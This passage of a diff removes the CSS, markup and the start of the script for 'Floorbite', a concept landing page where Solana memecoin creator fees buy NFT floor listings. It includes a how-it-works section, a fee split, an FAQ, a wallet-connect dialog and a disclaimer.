-.stat b{display:block;font:800 2.2rem var(--head)}
-.stat span{color:var(--muted);font-size:.95rem}
-.stat b+span{display:block;margin-top:.1rem}
-.toolbar{display:flex;flex-wrap:wrap;gap:1rem 2rem;margin-top:2rem}
-.pills{display:flex;flex-wrap:wrap;gap:.4rem}
-.pill{font:600 .95rem var(--body);background:var(--card);color:var(--ink);border:2px solid var(--line);border-radius:999px;padding:.45rem .95rem;cursor:pointer}
-.pill:hover{border-color:var(--ink)}
-.pill[aria-pressed="true"]{background:var(--ink);color:var(--bg);border-color:var(--ink)}
-.count{margin-top:1.2rem;font-size:.95rem;color:var(--muted)}
-.trend{margin-top:2.5rem}
-.trendhead{display:flex;justify-content:space-between;align-items:baseline;gap:1rem}
-.trendhead a{font-weight:600;text-decoration:none;color:var(--muted)}
-.trendhead a:hover{color:var(--ink);text-decoration:underline}
-.trend p{color:var(--muted);margin-top:.6rem}
-.cg{display:grid;gap:1rem;grid-template-columns:repeat(auto-fill,minmax(15rem,1fr));margin-top:2rem}
-.coll{all:unset;box-sizing:border-box;cursor:pointer;display:flex;flex-direction:column;gap:.85rem;padding:1.2rem;background:var(--card);border:2px solid var(--line);border-radius:20px}
-.coll:hover{border-color:var(--ink)}
-.coll:focus-visible{outline:3px solid var(--blue);outline-offset:3px}
-.pic{display:block;width:100%;aspect-ratio:1;border-radius:14px;overflow:hidden}
-.pic svg{display:block;width:100%;height:100%}
-.pic img{display:block;width:100%;height:100%;object-fit:cover;background:var(--bg)}
-.cname{font:800 1.15rem/1.2 var(--head);letter-spacing:-.01em;overflow-wrap:anywhere;min-height:2.4em}
-.more{display:inline-block;margin-left:.5rem;padding:.1rem .6rem;border-radius:999px;background:var(--chomp);color:#22103D;font-weight:600;font-size:.85rem}
-.floor{background:var(--bg);border-radius:14px;padding:.8rem 1rem}
-.floor small{display:block;color:var(--muted);font-size:.85rem}
-.floor strong{display:block;font:800 1.7rem/1.15 var(--head);letter-spacing:-.02em}
-.floor span{color:var(--muted);font-size:.95rem}
-.via{color:var(--muted);font-size:.8rem}
-.pager{display:flex;gap:.4rem;flex-wrap:wrap;align-items:center;margin-top:2.5rem}
-.pager a{font:600 .95rem var(--body);text-decoration:none;padding:.5rem .95rem;border:2px solid var(--line);border-radius:999px;background:var(--card)}
-.pager a:hover{border-color:var(--ink)}
-.pager a[aria-current="page"]{background:var(--ink);color:var(--bg);border-color:var(--ink)}
-.pager a[aria-disabled="true"]{opacity:.4;pointer-events:none}
-.range{margin-top:1.5rem;color:var(--muted);font-size:.95rem}
-.range b{color:var(--ink)}
-.cbox{position:relative}
-.cbox::after{content:'';position:absolute;right:1rem;top:1.2rem;border:.35rem solid transparent;border-top-color:var(--muted);pointer-events:none}
-.cbox input{padding-right:2.4rem}
-.cbox.has input{padding-left:3.5rem}
-.cthumb{position:absolute;left:.55rem;top:.45rem;width:2.2rem;height:2.2rem;display:none;border-radius:9px;overflow:hidden;z-index:1}
-.cbox.has .cthumb{display:block}
-.cthumb .pic,.cpic .pic{border-radius:0}
-.clist{position:absolute;left:0;right:0;top:calc(100% + .4rem);z-index:20;margin:0;padding:.35rem;list-style:none;background:var(--card);border:2px solid var(--ink);border-radius:16px;max-height:16rem;overflow:auto;box-shadow:0 14px 34px rgba(20,8,40,.35)}
-.copt{display:flex;align-items:center;gap:.7rem;padding:.4rem .55rem;border-radius:12px;cursor:pointer}
-.copt:hover,.copt.on{background:var(--bg)}
-.copt[aria-selected="true"]{outline:2px solid var(--chomp);outline-offset:-2px}
-.cpic{width:2.5rem;height:2.5rem;flex:none;border-radius:10px;overflow:hidden}
-.cn{flex:1;min-width:0;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.cf{color:var(--muted);font-size:.85rem;white-space:nowrap}
-.cempty{padding:.8rem;color:var(--muted)}
-#f-floor{background:var(--bg);border-radius:12px;padding:.5rem .8rem;font-weight:600;color:var(--ink)}
-textarea{width:100%;font:inherit;color:var(--ink);background:var(--bg);border:2px solid var(--line);border-radius:12px;padding:.7rem .9rem;resize:vertical;min-height:6.5rem}
-textarea:focus-visible{outline:3px solid var(--blue);outline-offset:2px}
-input[aria-invalid="true"],textarea[aria-invalid="true"]{border-color:#D6336C}
-.btn:disabled{opacity:.45;cursor:not-allowed}
-.btn:disabled:hover{background:var(--ink);color:var(--bg)}
-.lp{display:grid;gap:1.25rem;margin-top:2rem}
-@media(min-width:64rem){.lp{grid-template-columns:12.5rem minmax(0,1fr) 16.5rem;align-items:start}.lprev{position:sticky;top:1rem}}
-.lsteps{list-style:none;margin:0;padding:0;display:flex;gap:.4rem;overflow-x:auto;scrollbar-width:none}
-@media(min-width:64rem){.lsteps{flex-direction:column;gap:.25rem;overflow:visible}}
-.lsteps button{display:flex;gap:.7rem;align-items:center;width:100%;text-align:left;background:transparent;border:2px solid transparent;border-radius:14px;padding:.55rem .7rem;color:var(--muted);font:inherit;cursor:pointer;white-space:nowrap}
-.lsteps button:disabled{opacity:.5;cursor:default}
-.lsteps button[aria-current="step"]{background:var(--card);border-color:var(--line);color:var(--ink)}
-.sn{flex:none;width:2.2rem;height:2.2rem;border-radius:10px;display:grid;place-items:center;font:700 .8rem ui-monospace,Menlo,monospace;border:2px solid var(--line);background:var(--bg)}
-.lsteps [aria-current="step"] .sn{background:var(--ink);color:var(--bg);border-color:var(--ink)}
-.lsteps .done .sn{background:var(--mint);border-color:var(--mint);color:#0D3B2E}
-.sl b{display:block;font-weight:600;color:var(--ink);line-height:1.25}
-.sl small{display:block;font-size:.82rem;line-height:1.25}
-@media(max-width:63.99rem){.sl small{display:none}}
-.lcard{background:var(--card);border:2px solid var(--line);border-radius:22px;padding:1.5rem}
-.lpanel[hidden]{display:none}
-.lpanel h3{font-size:1.5rem}
-.pd{color:var(--muted);margin-top:.3rem}
-.linfo{font-size:.92rem;color:var(--muted);margin:1.1rem 0 .2rem}
-.linfo b{color:var(--ink)}
-.two{display:grid;grid-template-columns:minmax(0,2fr) minmax(0,1fr);gap:.75rem;margin-top:1.2rem}
-.lpanel .two input{margin:0}
-@media(max-width:30rem){.two{grid-template-columns:1fr}.lpanel .two input+input{margin-top:.6rem}}
-.lpanel label{margin:1.2rem 0 .4rem}
-.cnt{float:right;font:.85rem ui-monospace,Menlo,monospace;color:var(--muted);font-weight:400}
-.lpanel input+input,.lpanel .stack input{margin-top:.6rem}
-.drop{position:relative;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:.25rem;text-align:center;border:2px dashed var(--line);border-radius:16px;padding:1.6rem 1rem;background:var(--bg);min-height:8rem}
-.drop:hover,.drop.over,.drop:focus-within{border-color:var(--blue)}
-.drop input[type=file]{position:absolute;inset:0;width:100%;height:100%;opacity:0;cursor:pointer;margin:0}
-.drop strong{font-weight:600;display:block}
-.drop small{color:var(--muted);display:block}
-.drop .thumb{width:4.5rem;height:4.5rem;border-radius:16px;object-fit:cover;margin-bottom:.4rem}
-.lerr{color:#C0264B;font-weight:600;margin-top:1rem}
-.lerr:empty{display:none}
-@media(prefers-color-scheme:dark){:root:not([data-theme="light"]) .lerr{color:#FF8FA8}}
-:root[data-theme="dark"] .lerr{color:#FF8FA8}
-.lbtns{display:flex;justify-content:space-between;gap:.6rem;margin-top:1.4rem;padding-top:1.2rem;border-top:2px solid var(--line)}
-a.btn{text-decoration:none;display:inline-block}
-.lnote{border:2px solid var(--line);border-left:5px solid var(--blue);border-radius:14px;padding:.8rem 1rem;margin:1.2rem 0 0;font-size:.95rem}
-.lnote b{font-weight:700}
-.lsearch{margin-top:1.1rem}
-.lsearch input{margin:0}
-.lgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(14rem,1fr));gap:.6rem;max-height:30rem;overflow:auto;padding:.25rem .3rem .25rem .1rem;margin-top:.9rem}
-.lopt{display:flex;gap:.8rem;align-items:center;text-align:left;background:var(--bg);border:2px solid var(--line);border-radius:14px;padding:.7rem;font:inherit;color:var(--ink);cursor:pointer;width:100%}
-.lopt:hover{border-color:var(--muted)}
-.lopt[aria-checked="true"]{border-color:var(--blue);box-shadow:0 0 0 3px rgba(108,123,255,.25)}
-.lpic{width:2.8rem;height:2.8rem;border-radius:10px;overflow:hidden;flex:none}
-.lpic .pic{border-radius:0}
-.lt{min-width:0;flex:1}
-.lname{display:block;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.lfl{display:block;font-size:.82rem;color:var(--muted);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.lradio{flex:none;width:1.3rem;height:1.3rem;border-radius:50%;border:2px solid var(--line)}
-.lopt[aria-checked="true"] .lradio{border-color:var(--blue);background:radial-gradient(var(--blue) 42%,transparent 48%)}
-.lpols{display:grid;gap:.7rem;margin-top:1.2rem}
-.lopt.pol{align-items:flex-start;padding:1rem}
-.lopt.pol b{display:block;font-weight:700}
-.lopt.pol span.d{display:block;color:var(--muted);font-size:.95rem;margin-top:.15rem}
-.lempty{padding:1rem;color:var(--muted);grid-column:1/-1}
-.rrows{margin-top:1.1rem}
-.rrow{display:flex;justify-content:space-between;align-items:center;gap:1rem;padding:.75rem 0;border-top:2px solid var(--line)}
-.rrow>span{color:var(--muted)}
-.rrow>b{font-weight:600;text-align:right;display:inline-flex;gap:.5rem;align-items:center;min-width:0;overflow-wrap:anywhere}
-.rrow .lpic{width:1.7rem;height:1.7rem;border-radius:7px}
-.fbox{background:var(--bg);border-radius:14px;padding:.4rem 1rem .9rem;margin:1.1rem 0}
-.fbox .rrow:first-child{border-top:0}
-.fbox small{color:var(--muted)}
-.mono{font-family:ui-monospace,Menlo,monospace;font-size:.95em}
-.rbul{margin:1.1rem 0;padding-left:1.1rem;font-size:.95rem}
-.rbul li{margin:.35rem 0}
-.ratio{font-size:.92rem;color:var(--muted);border:2px solid var(--line);border-radius:12px;padding:.7rem 1rem}
-.ratio b{color:var(--ink);font-family:ui-monospace,Menlo,monospace}
-.lgo{width:100%;margin-top:1.1rem;display:block;text-align:center}
-.lres{margin-top:1rem;background:var(--bg);border:2px solid var(--mint);border-radius:14px;padding:.9rem 1rem;font-size:.95rem}
-.lres[hidden]{display:none}
-.badge2{font:700 .72rem ui-monospace,Menlo,monospace;letter-spacing:.1em;border:2px solid var(--line);border-radius:6px;padding:.12rem .45rem;text-transform:uppercase;color:var(--ink)}
-.lprev{background:var(--card);border:2px solid var(--line);border-radius:22px;overflow:hidden}
-.lprev .ph{display:flex;gap:.8rem;align-items:center;padding:1rem 1.1rem;border-bottom:2px solid var(--line)}
-.av{width:2.8rem;height:2.8rem;border-radius:50%;background:var(--mint);color:#0D3B2E;display:grid;place-items:center;font:800 1.2rem var(--head);overflow:hidden;flex:none}
-.av img{width:100%;height:100%;object-fit:cover;display:block}
-.ph b{display:block;font:800 1.15rem/1.2 var(--head);overflow-wrap:anywhere}
-.ph small{color:var(--muted);overflow-wrap:anywhere}
-.lprev .pr{display:flex;justify-content:space-between;align-items:center;gap:.6rem;padding:.55rem 1.1rem;font-size:.95rem}
-.lprev .pr>span{color:var(--muted)}
-.lprev .pr>b{font-weight:600;display:inline-flex;gap:.4rem;align-items:center;min-width:0;text-align:right}
-.lprev .pr .lpic{width:1.4rem;height:1.4rem;border-radius:6px}
-.lprev .pf{border-top:2px solid var(--line);padding:1rem 1.1rem}
-.lprev .pf h4{margin:0 0 .6rem;font:700 .72rem ui-monospace,Menlo,monospace;letter-spacing:.12em;text-transform:uppercase;color:var(--muted)}
-.pbar{display:flex;height:.55rem;border-radius:999px;overflow:hidden;background:var(--line)}
-.pbar i{display:block;width:80%;background:var(--mint)}
-.pbar i+i{width:20%;background:var(--chomp)}
-.lprev .pl{display:flex;justify-content:space-between;font-size:.92rem;margin-top:.5rem}
-.lprev .pl::before{content:'';width:.6rem;height:.6rem;border-radius:2px;background:var(--mint);margin:.45rem .5rem 0 0;flex:none}
-.lprev .pl+.pl::before{background:var(--chomp)}
-.lprev .pl>span{flex:1}
-.lprev .pn{font-size:.8rem;color:var(--muted);margin-top:.8rem}
-.board{display:grid;grid-template-columns:minmax(0,1fr);gap:2.5rem 2rem}
-.board>*{min-width:0}
-.board .pills,.btop{flex-wrap:wrap}
-@media(min-width:60rem){.board{grid-template-columns:minmax(0,1.7fr) minmax(0,1fr);align-items:start}}
-.bh{display:flex;justify-content:space-between;align-items:center;gap:1rem}
-.bh h2{font-size:clamp(1.5rem,3vw,1.9rem)}
-.bpg{display:inline-flex;align-items:center;gap:.5rem;font:600 .9rem ui-monospace,Menlo,monospace;color:var(--muted)}
-.bpg button{all:unset;cursor:pointer;width:1.8rem;height:1.8rem;display:grid;place-items:center;border-radius:8px;font-size:1.2rem;color:var(--ink)}
-.bpg button:hover:not(:disabled){background:var(--card)}
-.bpg button:disabled{opacity:.3;cursor:default}
-.bpg button:focus-visible{outline:3px solid var(--blue)}
-.board .pills{margin-top:1.1rem}
-.btop{display:flex;flex-wrap:wrap;gap:.6rem;align-items:center;margin-top:1.1rem}
-.btop .pills{margin-top:0}
-.await{display:flex;justify-content:space-between;align-items:center;gap:1rem;flex-wrap:wrap;margin-top:1.6rem}
-.await h3{font-size:1.15rem}
-.await p{color:var(--muted);font-size:.95rem;margin-top:.15rem}
-.await .btn{padding:.6rem 1.1rem}
-.ph3{display:grid;grid-template-columns:repeat(auto-fit,minmax(10.5rem,1fr));gap:1rem;margin-top:1.2rem}
-.slot{border:2px dashed var(--line);border-radius:20px;overflow:hidden;background:var(--card);display:flex;flex-direction:column}
-.slot .plus{height:9.5rem;display:grid;place-items:center}
-.slot .plus span{width:3rem;height:3rem;border:2px dashed var(--line);border-radius:50%;display:grid;place-items:center;font-size:1.4rem;color:var(--blue);line-height:1}
-.slot .meta{border-top:2px dashed var(--line);padding:.9rem 1rem 1.1rem}
-.slot .meta b{display:block;font:700 .68rem ui-monospace,Menlo,monospace;letter-spacing:.12em;text-transform:uppercase;color:var(--muted)}
-.slot .meta i{display:block;height:.45rem;border-radius:99px;background:var(--line);margin-top:.6rem;width:86%}
-.slot .meta i+i{width:58%;margin-top:.4rem}
-.feat{display:block;width:100%;text-align:left;font:inherit;color:var(--ink);background:var(--card);border:2px solid var(--line);border-radius:20px;padding:1.2rem;margin-top:1.1rem;cursor:pointer}
-.feat:hover,.brow:hover{border-color:var(--blue)}
-.feat .fh{display:flex;gap:1rem;align-items:center}
-.feat .fp{width:4rem;height:4rem;border-radius:14px;overflow:hidden;flex:none}
-.feat .fp .pic,.brow .rp .pic{border-radius:0}
-.feat .fn{font:800 1.25rem/1.15 var(--head);overflow-wrap:anywhere}
-.feat .fr{font-weight:600;margin-top:1.1rem}
-.feat .fs{font-size:.88rem;color:var(--muted);margin-top:.25rem}
-.blist{margin-top:.8rem;display:grid;grid-template-columns:minmax(0,1fr);gap:.5rem}
-.brow{display:flex;align-items:center;gap:.8rem;width:100%;text-align:left;font:inherit;color:var(--ink);background:var(--card);border:2px solid var(--line);border-radius:14px;padding:.6rem .8rem;cursor:pointer}
-.brow .rk{width:1rem;font:600 .85rem ui-monospace,Menlo,monospace;color:var(--muted);text-align:right;flex:none}
-.brow .rp{width:2.2rem;height:2.2rem;border-radius:8px;overflow:hidden;flex:none}
-.brow .rn{flex:1;min-width:0;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.brow .ra{font:700 .75rem ui-monospace,Menlo,monospace;color:#1B7F66;white-space:nowrap}
-@media(prefers-color-scheme:dark){:root:not([data-theme="light"]) .brow .ra{color:var(--mint)}}
-:root[data-theme="dark"] .brow .ra{color:var(--mint)}
-#f-floor:empty{display:none}
-.phead{display:flex;justify-content:space-between;align-items:flex-end;gap:1.5rem 2rem;flex-wrap:wrap}
-.hstats{display:flex;gap:1.2rem 2rem;flex-wrap:wrap}
-.hstat small{display:block;color:var(--muted);font-size:.85rem}
-.hstat b{display:block;font:800 1.6rem/1.15 var(--head);letter-spacing:-.02em}
-.fbar{display:flex;flex-wrap:wrap;gap:.8rem 1.2rem;align-items:center;margin-top:2rem;padding-bottom:1.2rem;border-bottom:2px solid var(--line)}
-.fbar select{width:auto;min-width:12rem;font-weight:600;padding:.5rem .8rem}
-.pill .n{opacity:.6;margin-left:.4rem;font-size:.85em}
-.search{position:relative;max-width:28rem;margin-top:1.5rem}
-.search svg{position:absolute;left:1rem;top:50%;transform:translateY(-50%);width:1.1rem;height:1.1rem;stroke:var(--muted);fill:none;stroke-width:2;stroke-linecap:round;pointer-events:none}
-.search input{padding-left:2.8rem;border-radius:999px}
-.solprice{text-align:right}
-.solprice small{display:block;color:var(--muted);font-size:.85rem}
-.solprice b{display:block;font:800 1.8rem/1.15 var(--head)}
-.rstats{display:grid;grid-template-columns:repeat(4,1fr);margin-top:2rem;background:var(--card);border:2px solid var(--line);border-radius:20px;overflow:hidden}
-.rstats>div{padding:1.1rem 1.3rem;border-left:2px solid var(--line)}
-.rstats>div:first-child{border-left:0}
-.rstats small{display:block;color:var(--muted);font-size:.85rem}
-.rstats b{display:block;font:800 1.6rem/1.2 var(--head);letter-spacing:-.02em}
-.rstats .mint b{color:#1FA37C}
-@media(max-width:48rem){.rstats{grid-template-columns:repeat(2,1fr)}.rstats>div:nth-child(odd){border-left:0}.rstats>div:nth-child(n+3){border-top:2px solid var(--line)}}
-.rgrid{display:grid;gap:1.5rem;margin-top:1.5rem}
-@media(min-width:60rem){.rgrid{grid-template-columns:1.7fr 1fr;align-items:start}}
-.tabbar{display:flex;justify-content:space-between;align-items:center;gap:1rem;flex-wrap:wrap}
-.tablist{display:inline-flex;gap:.25rem;padding:.25rem;background:var(--card);border:2px solid var(--line);border-radius:999px}
-.tablist button{font:600 .95rem var(--body);border:0;background:transparent;color:var(--muted);padding:.45rem .95rem;border-radius:999px;cursor:pointer}
-.tablist button[aria-selected="true"]{background:var(--ink);color:var(--bg)}
-.tabbar select{width:auto;min-width:11rem;font-weight:600;padding:.5rem .8rem}
-.rgrid .card{margin-top:1rem}
-.side .card{margin-top:0;margin-bottom:1.25rem}
-.side h3{font-size:1.15rem}
-.side .card>p{margin-top:.5rem;font-size:.95rem}
-.side .card .empty{margin-top:1.5rem;text-align:center}
-.bycol{list-style:none;margin:1rem 0 0;padding:0}
-.bycol li{display:flex;gap:.8rem;align-items:center;padding:.7rem 0;border-top:2px solid var(--line)}
-.bycol .bp{width:2.5rem;height:2.5rem;border-radius:10px;overflow:hidden;flex:none}
-.bycol .bn{flex:1;min-width:0;font-weight:600;overflow-wrap:anywhere}
-.bycol small{display:block;color:var(--muted);font-weight:400;font-size:.85rem}
-.bycol .bv{text-align:right;font-weight:600;white-space:nowrap}
-.bycol .bp .pic{border-radius:0}
-.note{margin-top:1.2rem;color:var(--muted);font-size:.85rem;max-width:44rem}
-.agrid{display:grid;gap:1.5rem;margin-top:1.5rem}
-@media(min-width:60rem){.agrid{grid-template-columns:1fr 1.3fr;align-items:start}}
-.agrid .card,.achart.card{margin-top:0}
-.achart.card{margin-top:1.5rem}
-.card h3+p{margin-top:.4rem;font-size:.95rem}
-.chart{display:block;width:100%;height:auto;margin-top:1rem;color:var(--ink)}
-.hbars{list-style:none;margin:1rem 0 0;padding:0;display:grid;gap:.75rem}
-.hb{display:grid;grid-template-columns:minmax(0,9rem) 1fr 4.2rem;gap:.8rem;align-items:center;font-size:.95rem}
-.hb.pic3{grid-template-columns:2.2rem minmax(0,8rem) 1fr 4.2rem}
-.hb .nm{font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.hb .track{height:.8rem;background:var(--bg);border-radius:999px;overflow:hidden}
-.hb .fill{display:block;height:100%;background:var(--chomp);border-radius:999px}
-.hb .vl{text-align:right;font-weight:600;white-space:nowrap}
-.hb .tp{width:2.2rem;height:2.2rem;border-radius:9px;overflow:hidden}
-.hb .tp .pic{border-radius:0}
-@media(max-width:34rem){.hb{grid-template-columns:minmax(0,6.5rem) 1fr 3.6rem}.hb.pic3{grid-template-columns:2.2rem minmax(0,5.5rem) 1fr 3.6rem}}
-.srcnote{margin-top:1.5rem;color:var(--muted);font-size:.85rem;max-width:44rem}
-.prose h3{margin-top:2rem}
-.prose p{color:var(--muted);margin-top:.5rem;max-width:42rem}
-
-.foot{border-top:2px solid var(--line);margin-top:2rem;padding:3rem 0 2.5rem;color:var(--muted)}
-.fgrid{display:grid;gap:2rem}
-@media(min-width:48rem){.fgrid{grid-template-columns:2fr 1fr 1fr}}
-.fbrand p{margin-top:.8rem;max-width:30rem;font-size:.95rem}
-.fbrand .logo{color:var(--ink);display:inline-block}
-.foot h3{font-size:1rem;color:var(--ink);margin-bottom:.8rem}
-.foot ul{list-style:none;margin:0;padding:0;display:grid;gap:.5rem}
-.foot a{text-decoration:none}
-.foot a:hover{color:var(--ink);text-decoration:underline}
-.disc{margin-top:2rem;font-size:.85rem;max-width:46rem}
-
-dialog{width:min(30rem,calc(100vw - 2rem));max-height:calc(100dvh - 2rem);overflow:auto;background:var(--card);color:var(--ink);border:2px solid var(--line);border-radius:22px;padding:1.5rem}
-dialog::backdrop{background:rgba(20,8,40,.6)}
-.dh{display:flex;justify-content:space-between;align-items:center}
-.x{all:unset;cursor:pointer;font-size:1.6rem;line-height:1;padding:.2rem .6rem;border-radius:8px}
-.x:focus-visible{outline:3px solid var(--blue)}
-label{display:block;font-weight:600;margin:1rem 0 .35rem}
-input,select{width:100%;font:inherit;color:var(--ink);background:var(--bg);border:2px solid var(--line);border-radius:12px;padding:.7rem .9rem}
-input:focus-visible,select:focus-visible{outline:3px solid var(--blue);outline-offset:2px}
-.hint{font-size:.9rem;color:var(--muted);margin-top:.35rem}
-.acts{display:flex;gap:.6rem;margin-top:1.4rem;flex-wrap:wrap}
-dl.sum{display:grid;grid-template-columns:auto 1fr;gap:.5rem 1rem;margin:1rem 0 0}
-dl.sum dt{color:var(--muted)}
-dl.sum dd{margin:0;font-weight:600;word-break:break-all}
-.wlist{display:grid;gap:.7rem;margin-top:1rem}
-.wlist .btn{text-align:left;text-decoration:none;display:block}
-.toast{position:fixed;left:50%;bottom:calc(1.5rem + env(safe-area-inset-bottom,0px));transform:translate(-50%,200%);background:var(--ink);color:var(--bg);padding:.8rem 1.2rem;border-radius:12px;transition:transform .25s;max-width:90vw;z-index:10}
-.toast.show{transform:translate(-50%,0)}
-[hidden]{display:none!important}
-
-@media (prefers-reduced-motion:reduce){
-  .jaw,.tile{animation:none}
-  .tile{left:auto;position:relative;display:inline-grid;margin:32px 6px 0}
-  .stage{height:auto;padding-left:130px;min-height:120px}
-  .toast{transition:none}
-}
-</style>
-</head>
-<body>
-<div class="wrap">
-  <header>
-    <div class="bar">
-      <a class="logo" href="#/">Floorbite</a>
-      <div class="hbtns">
-        <a class="xlink" href="https://x.com/floorb1te" target="_blank" rel="noopener" aria-label="Floorbite on X"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
-        <button class="btn ghost" data-wallet>Connect wallet</button>
-        <button class="btn" data-launch>Launch a coin</button>
-      </div>
-    </div>
-    <nav class="nav" id="nav" aria-label="Main">
-      <a href="#/explore">Explore</a><a href="#/collections">Collections</a><a href="#/gallery">Gallery</a><a href="#/receipts">Receipts</a><a href="#/analytics">Analytics</a><a href="#/docs">Docs</a>
-    </nav>
-  </header>
-
-  <main id="main">
-    <div id="home">
-      <div class="hero">
-        <h1>Your coin eats an NFT floor.</h1>
-        <p class="lead">Bind a coin to one NFT collection. Most of its creator fees flow into a vault that can only buy that collection. You choose where the NFTs end up.</p>
-        <button class="btn big" data-launch>Launch a coin</button>
-        <div class="stage" aria-hidden="true">
-          <svg class="mascot" viewBox="0 0 100 100">
-            <polygon points="10,52 100,52 100,84" fill="#22103D"/>
-            <g class="jaw">
-              <path d="M0 52H100V90Q100 100 90 100H10Q0 100 0 90Z" fill="#2FC293"/>
-              <path d="M30 52l6-10 6 10zM58 52l6-10 6 10z" fill="#fff"/>
-            </g>
-            <path d="M0 52V10Q0 0 10 0H90Q100 0 100 10V52Z" fill="#3FD9A8"/>
-            <path d="M22 52l6 10 6-10zM50 52l6 10 6-10zM76 52l6 10 6-10z" fill="#fff"/>
-            <circle cx="30" cy="24" r="9" fill="#fff"/><circle cx="66" cy="24" r="9" fill="#fff"/>
-            <circle cx="33" cy="25" r="4.5" fill="#22103D"/><circle cx="69" cy="25" r="4.5" fill="#22103D"/>
-            <circle cx="12" cy="40" r="5" fill="#FF6FB5" opacity=".75"/>
-            <path d="M44 4q6-8 12 0" stroke="#22103D" stroke-width="3" fill="none" stroke-linecap="round"/>
-          </svg>
-          <div class="tile t1">#12</div><div class="tile t2">#87</div><div class="tile t3">#304</div><div class="tile t4">#41</div><div class="tile t5">#9</div>
-        </div>
-        <p class="cap">Meet Biter. Every tile is a listing at the bottom of the collection, and the vault buys the cheapest first.</p>
-      </div>
-
-      <section>
-        <h2>How it works</h2>
-        <p class="intro">Three steps, and the last one runs on its own.</p>
-        <ol class="steps">
-          <li><div><h3>Pick a collection</h3><p>Choose the one NFT collection your coin is tied to. The choice is fixed at launch.</p></div></li>
-          <li><div><h3>Trade the coin</h3><p>Every trade produces creator fees. 80% of them go to the coin’s vault.</p></div></li>
-          <li><div><h3>The vault buys the floor</h3><p>The vault can spend only on your collection, so fees become floor purchases.</p></div></li>
-        </ol>
-      </section>
-
-      <section>
-        <div class="split">
-          <div>
-            <h2>Where the fees go</h2>
-            <p class="intro">Most of the fees are locked into buying NFTs. The rest goes to whoever launched the coin.</p>
-            <div class="fees" role="img" aria-label="80 percent to the vault, 20 percent to the launcher"><span class="v">80% to the vault</span><span class="o">20%</span></div>
-            <p class="legend">The vault is a one-purpose wallet. It cannot send funds anywhere else.</p>
-          </div>
-          <div>
-            <h3 style="margin-bottom:1rem">Then choose what happens to the NFTs</h3>
-            <div class="dest" id="dest">
-              <button aria-pressed="true" data-msg="The NFTs stay in the vault. The coin’s holders can see the growing stash at any time."><strong>Keep them in the vault</strong><p>A public treasury that grows with every trade.</p></button>
-              <button aria-pressed="false" data-msg="Each NFT is sent to a burn address. The collection’s supply shrinks."><strong>Burn them</strong><p>Remove them from supply for good.</p></button>
-              <button aria-pressed="false" data-msg="NFTs are handed out to coin holders in a draw."><strong>Give them to holders</strong><p>Reward people who hold the coin.</p></button>
-            </div>
-            <p class="result" id="result" aria-live="polite">The NFTs stay in the vault. The coin’s holders can see the growing stash at any time.</p>
-          </div>
-        </div>
-      </section>
-
-      <section>
-        <h2 style="max-width:20ch;margin-bottom:1.5rem">Ready to feed a floor?</h2>
-        <button class="btn big" data-launch>Launch a coin</button>
-      </section>
-
-      <section id="board" aria-label="Top coins and collections"></section>
-
-      <section>
-        <h2>Questions</h2>
-        <div style="margin-top:2rem">
-          <details><summary>Can the vault buy anything else?</summary><p>No. It is bound to the single collection you picked, so it has no way to spend on other tokens or send funds out.</p></details>
-          <details><summary>Does this make the floor go up?</summary><p>Buying listings removes supply from the market, which can lift the floor price. It is not guaranteed, and a floor can also fall.</p></details>
-          <details><summary>Can I change the collection later?</summary><p>No. The collection and the NFT destination are set when the coin is launched.</p></details>
-          <details><summary>Who can launch a coin?</summary><p>Anyone with a collection in mind.</p></details>
-        </div>
-      </section>
-    </div>
-    <div id="views"></div>
-  </main>
-
-  <footer class="foot">
-    <div class="fgrid">
-      <div class="fbrand">
-        <a class="logo" href="#/">Floorbite</a>
-        <p>Memecoin fees that buy NFT floors on Solana. Pump routes the fees; Floorbite’s operator manages funds, NFT custody and buybacks.</p>
-        <p><a href="https://x.com/floorb1te" target="_blank" rel="noopener">@floorb1te</a></p>
-        <p>Independent project. Not affiliated with pump.fun.</p>
-      </div>
-      <nav aria-label="Product links"><h3>Product</h3><ul>
-        <li><a href="#/explore">Explore</a></li><li><a href="#/receipts">Receipts</a></li><li><a href="#/analytics">Analytics</a></li><li><a href="#/launch">Launch</a></li><li><a href="#/collections">Collections</a></li>
-      </ul></nav>
-      <nav aria-label="Legal links"><h3>Legal</h3><ul>
-        <li><a href="#/docs">Docs</a></li><li><a href="https://solscan.io/" target="_blank" rel="noopener">Solscan</a></li><li><a href="#/trust">Trust</a></li><li><a href="#/terms">Terms</a></li><li><a href="#/privacy">Privacy</a></li>
-      </ul></nav>
-    </div>
-    <p class="disc">Floorbite is a concept page. Nothing here is financial advice or a promise of returns. Coins and NFTs are volatile and can lose all of their value.</p>
-  </footer>
-</div>
-
-<dialog id="wallet" aria-labelledby="wt">
-  <div class="dh"><h2 id="wt" style="font-size:1.6rem">Connect wallet</h2><button class="x" data-close aria-label="Close">×</button></div>
-  <div class="wlist" id="wlist"></div>
-  <p class="hint" id="whint">Connecting only shares your public address. It doesn’t move any funds.</p>
-</dialog>
-<div class="toast" id="toast" role="status"></div>
-
-<script>
-(function(){
-  var $=function(id){return document.getElementById(id)};
-  var toast=$('toast'),tt;
-  function say(m){toast.textContent=m;toast.classList.add('show');clearTimeout(tt);tt=setTimeout(function(){toast.classList.remove('show')},3200)}
-  function el(tag,txt,cls){var e=document.createElement(tag);if(txt!=null)e.textContent=txt;if(cls)e.className=cls;return e}
-
-  /* ---------- pages ---------- */
-  var EMPTY='Nothing here yet. This fills up once the first coin launches.';
-  var PAGES={
-    explore:{t:'Explore',p:'Every coin launched here — the collection each one is sweeping and what its fees have bought so far.',custom:'explore'},
-    collections:{t:'Collections',p:'Solana NFT collections a coin can be paired with. Pick one to start a launch.',custom:'collections'},
-    gallery:{t:'Gallery',p:'Each NFT that memecoin fees have bought: what it cost, which coin paid, and where it ended up.',custom:'gallery'},
